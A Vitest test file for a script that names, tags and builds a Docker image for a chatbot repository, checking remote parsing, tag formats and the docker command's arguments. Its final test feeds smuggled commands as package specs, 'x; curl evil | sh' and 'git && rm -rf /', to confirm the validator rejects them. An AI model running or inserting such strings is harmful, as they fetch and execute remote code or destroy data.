import { describe, expect, it } from "vitest";
import { imageName, imageTag, plan, repoFromRemote } from "./build.js";

describe("the image is named after the bot's repository", () => {
  it("reads owner/repo from either remote form, lowercased", () => {
    expect(repoFromRemote("git@github.com:Someone/HomeBoxCordLLM.git")).toBe("someone/homeboxcordllm");
    expect(repoFromRemote("https://github.com/someone/hasscordllm")).toBe("someone/hasscordllm");
    expect(repoFromRemote("/srv/git/bare.git")).toBeUndefined();
  });

  it("prefers the flag, then package.json, then CI's repository, then the remote", () => {
    const base = { settings: {}, env: {}, packageName: "mybot" };
    expect(imageName({ ...base, flag: "x/y" })).toBe("x/y");
    expect(imageName({ ...base, settings: { image: "reg/z" }, remote: "git@github.com:a/b.git" })).toBe("reg/z");
    expect(imageName({ ...base, env: { GITHUB_REPOSITORY: "Owner/Repo" }, remote: "git@github.com:a/b.git" })).toBe("ghcr.io/owner/repo");
    expect(imageName({ ...base, remote: "git@github.com:a/b.git" })).toBe("ghcr.io/a/b");
  });

  it("falls back to a local-only name that cannot be pushed by accident", () => {
    expect(imageName({ settings: {}, env: {}, packageName: "@me/mybot" })).toBe("mybot");
  });
});

describe("tags", () => {
  it("use a git tag verbatim", () => {
    expect(imageTag({ env: { GITHUB_REF: "refs/tags/v1.2.0", GITHUB_SHA: "abcdef1234" } })).toBe("v1.2.0");
  });

  it("sort numerically on the run number for a branch build", () => {
    expect(
      imageTag({ env: { GITHUB_REF: "refs/heads/main", GITHUB_REF_NAME: "main", GITHUB_RUN_NUMBER: "42", GITHUB_SHA: "abcdef1234" } }),
    ).toBe("main-42-abcdef1");
  });

  it("mark a local build as one", () => {
    expect(imageTag({ env: {}, sha: "0123456789" })).toBe("dev-0123456");
    expect(imageTag({ env: {} })).toBe("dev");
  });
});

describe("the docker command", () => {
  const base = { botDir: "/bot", dockerfile: "/lib/docker/Dockerfile", image: "ghcr.io/a/b", tag: "dev", env: {} };

  it("passes what the bot bakes in as build args, and loads locally", () => {
    const p = plan({
      ...base,
      push: false,
      settings: { uvTools: ["homebox-mcp==1.5.1", "ha-mcp==8.6.0"], aptPackages: ["git"], smoke: "python -c 'import x'" },
    });
    expect(p.args).toContain("UV_TOOLS=homebox-mcp==1.5.1 ha-mcp==8.6.0");
    expect(p.args).toContain("APT_PACKAGES=git");
    expect(p.args).toContain("TOOLS_SMOKE=python -c 'import x'");
    expect(p.args.slice(-2)).toEqual(["--load", "/bot"]);
    expect(p.args).toContain("ghcr.io/a/b:dev");
  });

  it("adds nothing for a bot that bakes nothing in, and pushes when asked", () => {
    const p = plan({ ...base, push: true, settings: {} });
    expect(p.args.filter((a) => a === "--build-arg")).toEqual([]);
    expect(p.args.slice(-2)).toEqual(["--push", "/bot"]);
    expect(p.args).not.toContain("--cache-from");
  });

  it("caches layers in Actions", () => {
    expect(plan({ ...base, push: true, settings: {}, env: { ACTIONS_RUNTIME_TOKEN: "t" } }).args).toContain("type=gha,mode=max");
  });

  it("refuses a package spec that is more than a package spec", () => {
    expect(() => plan({ ...base, push: false, settings: { uvTools: ["x; curl evil | sh"] } })).toThrow(/plain package spec/);
    expect(() => plan({ ...base, push: false, settings: { aptPackages: ["git && rm -rf /"] } })).toThrow();
  });
});
